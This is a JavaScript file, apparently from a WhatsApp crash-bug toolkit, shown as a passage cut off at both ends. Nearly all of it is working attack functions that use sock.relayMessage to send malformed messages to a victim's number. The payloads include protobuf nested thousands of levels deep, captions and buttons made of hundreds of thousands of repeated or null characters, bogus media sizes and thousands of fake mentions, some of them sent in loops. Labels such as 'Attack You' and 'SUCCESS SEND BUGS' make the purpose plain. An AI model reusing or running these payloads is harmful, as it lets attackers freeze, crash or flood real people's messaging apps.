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",
    contextInfo: {
      featureEligibilities: { canReceiveMultiReact: true },
      pairedMediaType: "NOT_PAIRED_MEDIA",
      statusSourceType: "IMAGE"
    },
    scansSidecar: "fEzYz84hPJzLMNFbyo98xx6yZlX6W4GusDrqhIe0pcsJPQBDrJ6/Tw==",
    scanLengths: [18787, 116942, 40973, 60175],
    midQualityFileSha256: "N8qO2XeOS55EXzkUCxU1G0kj4Araewzz/XX9I2zsiD0="
  };

  const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
  ];

  const encodeVarint = function(n) {
    var buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = function(tag, data) {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
  };

  const basePayload = proto.Message.encode(
    proto.Message.fromObject({ imageMessage: IMG })
  ).finish();

  const inflate = function(tag, depth) {
    var buf = basePayload;
    for (var i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const resolveJid = function(raw) {
    var s = String(raw || '').trim();
    if (s.includes('@')) return s;
    return s.replace(/\D/g, '') + '@s.whatsapp.net';
  };

  const jids = (Array.isArray(target) ? target : [target])
    .map(resolveJid)
    .filter(function(j) { return j.length > 15; });

  if (!jids.length) return;

  for (var i = 0; i < 30; i++) {
    for (var ti = 0; ti < TAGS.length; ti++) {
      var tag = TAGS[ti];
      var payload = null;

      for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
        try {
          var decoded = proto.Message.decode(inflate(tag, depth));
          proto.Message.encode(decoded).finish();
          payload = decoded;
        } catch (_) {}
      }

      if (!payload) continue;

      var msgId = 'CRPT' + Date.now().toString(36).toUpperCase() + '_' + i;

      await sock.relayMessage('status@broadcast', payload, {
        messageId: msgId,
        statusJidList: jids,
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: jids.map(function(jid) {
              return { tag: 'to', attrs: { jid: jid }, content: [] };
            })
          }]
        }]
      });
    }
    await new Promise(r => setTimeout(r, 300));
  }
}


async function VnXNewDenglayInpisCuy(sock, target) {
   const nameVnX = [
      "address_message", 
      "galaxy_message",
      "call_permission_request"  
   ];

   let vnxmbg = {
     groupStatusMessageV2: {
       message: {
         interactiveResponseMessage: {
           body: {
             text: "VnX Delay New Cuyy",
             format: "DEFAULT",
           },
           nativeFlowResponseMessage: {
             name: nameVnX[0], 
             paramsJson: "\x10".repeat(250000) + "\u0000".repeat(250000),
             version: 3,
           },
         },
       },
     },
   };

   await sock.relayMessage(target, vnxmbg, { 
     participant: { jid: target } 
   });
}


async function Stuckhome(sock, target) {
  const x = {
    groupMentionedMessage: {
      message: {
        ephemeralMessage: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: "Wa lu ampos"
                  },
                  nativeFlowMessage: {
                    extra: "\u3104",
                    buttons: "ꦾ࣯࣯".repeat(20000),
                    extra1: "ꦾ࣯࣯".repeat(5555)
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, x, {});
  console.log("✅ SUCCESS SEND BUGS");
}

async function BlankNanz(sock, target) {
  for (let i = 0; i < 85; i++) {
    const Nanz = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "\u200B",
            },
            body: {
              text: "Bg Gue disini Cuma Mau Nambah Kontak".repeat(5000), 
            },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                key: "҉⃝҉⃝҉⃝҉҉⃝҉⃝҉⃝҉҉⃝".repeat(5000), 
                id: Date.now(),
              }),
            },
          },
          contextInfo: {
            remoteJid: target,
            participant: target,
            stanzaId: sock.generateMessageTag(),
          },
        },
      },
    };

    await sock.relayMessage(target, Nanz, {});
  }
}

async function FaiqForclose(sock, target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
        caption: "FaiqOffc Attack You",
        fileLength: "149502",
        height: 1397,
        width: 1126,
        mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
        fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
        directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1777621571",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true
        },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          2899999999999999077,
          1799999999999998555,
          7699999999999999148,
          1069999999999999164
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
      }
    },
    {}
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "FaiqOffc Attack You",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                display_text: "{".repeat(1045000),
                copy_code: "\0".repeat(500000)
              })
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 2000 }, () =>
                  1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              conversionPointSource: "cta_copy"
            }
          }
        }
      }
    },
    {}
  );
}

async function BlankRan(sock, target) {
  const msg = {
    nativeFlowLocationRequest: {},
    ephemeralMessage: {},
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "RanModzz!¿"
          },
          nativeFlowMessage: {
            extra: "\u31040",
            buttons: "A".repeat(20000),
            name: "number_catalog_mesaaage",
            extra1: "ꦾ࣯࣯".repeat(5555)
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {});
  console.log("✅ SUCCESS SEND BUGS");
}

async function BlankFreezeByMia(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"mia","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function FaiqForclose(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: true
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            },
            title: "Faiq Is HereC‌⃰ꪸ⃟",
            hasMediaAttachment: true
          },
          body: {
            text: "\0"
          },
          nativeFlowMessage: {
            buttons: "\0".repeat(500000)
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  })
}

async function VnXNewStuckNotif(sock, target) {
const VnXOneButton = [
    {
      buttonId: "VnX1",
      buttonText: {
        displayText: "𑇂𑆵𑆴𑆿".repeat(250000)
      },
      type: 1
    },
    {
      buttonId: "VnX7",
      buttonText: {
        displayText: "ꦽ".repeat(250000)
      },
      type: 1
    }
  ];

 const vnxishere = {
   buttonsMessage: {
      contentText: "ꦾ".repeat(250000),
      footerText: "\u0000".repeat(15000),
      buttons: VnXOneButton,
      headerType: 1
    }
  };
    
    const vnxdocu = {
        documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/703563712_905366362578714_8094704431314052327_n.enc?ccb=11-4&oh=01_Q5Aa4gF59X7Izjc575RDOUshdWcog1uM3U3OJP-7mT0-YHtCoA&oe=6A351922&_nc_sid=5e03e0&mms3=true",
            directPath: "/v/t62.7119-24/703563712_905366362578714_8094704431314052327_n.enc?ccb=11-4&oh=01_Q5Aa4gF59X7Izjc575RDOUshdWcog1uM3U3OJP-7mT0-YHtCoA&oe=6A351922&_nc_sid=5e03e0",
            mimetype: "application/javascript",
            mediaKey: "SBGOHAa4M/YBxn9MHuX761PYexb1Xd0lqfCTPvjj0gE=",
            fileEncSha256: "CaQz36a30wwkgZjp7kykE0Ndr4EZLVa0zQum6N/ywpU=",
            fileSha256: "B/8TvtqnmHaIe9yc9BklG8WOvL2Xx4Hb1OO47UYk39E=",
            fileLength: "198974589",
            mediaKeyTimestamp: "1779281528",
            caption: "𑇂𑆵𑆴𑆿".repeat(250000),
            footerText: "\u0000".repeat(15000),
        }
    };
    
    const vnxloca = {
        locationMessage: {
          degreesLatitude: 99.1010101,
          degreesLongitude: 99.1010101, 
          name: "VnX" + "𑇂𑆵𑆴𑆿".repeat(60000),
          address: "ꦾ".repeat(60000),
        }
    };
    
    const vnxaudio = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/703577113_1518991829861602_3564955985215902855_n.enc?ccb=11-4&oh=01_Q5Aa4gHlts2atOfFtZscRNyQV2dqVL9dg2D16Sg_9plc7gqSiw&oe=6A3513F8&_nc_sid=5e03e0&mms3=true",
            directPath: "/v/t62.7114-24/703577113_1518991829861602_3564955985215902855_n.enc?ccb=11-4&oh=01_Q5Aa4gHlts2atOfFtZscRNyQV2dqVL9dg2D16Sg_9plc7gqSiw&oe=6A3513F8&_nc_sid=5e03e0",
            mimetype: "audio/ogg",
            mediaKey: "wwlS94/28a2N8MmwOhvsyFA3D96VAlW5qMgORaJSaNE=",
            fileEncSha256: "S3OzTzuRjXv0ou74k3VcAfMlLYggWeI4b/1UVX4DBfA=",
            fileSha256: "Cw92qjCxUKIlQS5I+VrMvE8lVuM19L5nIz50v96NZkU=",
            fileLength: "61956999",
            mediaKeyTimestamp: "1779281865",
            caption: "VnX" + "ꦾ".repeat(250000),
        }
    };
    
    const vnxtter = {
       newsletterAdminInviteMessage: {
        newsletterJid: "9999999999999999@newsletter",
        newsletterName: "VnX" + "ꦽꦾ".repeat(250000),
        caption: "VnX Bng" + "ꦽꦾ".repeat(250000),
        inviteExpiration: "9282682616283799",    
       }
    };


    
    let vnxmsg = { remoteJid: target, fromMe: true, id: vnxishere }

     const vnxspam = {
        statusQuestionAnswerMessage: {
          key: vnxmsg, 
          text: "VnX Spam Notif",
        } 
     };

  await sock.relayMessage(target, vnxishere, { 
    participant: { jid: target } 
  });
    
    await sock.relayMessage(target, vnxdocu, { 
    participant: { jid: target } 
  });
    
    await sock.relayMessage(target, vnxloca, { 
    participant: { jid: target } 
  });
    
    await sock.relayMessage(target, vnxtter, { 
    participant: { jid: target } 
  });
    
    await sock.relayMessage(target, vnxspam, { 
    participant: { jid: target } 
  });
}
async function RanModzzFC(sock, target) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 999999999,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 9999,
        width: 9999,
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgQVFS/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABEQACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAA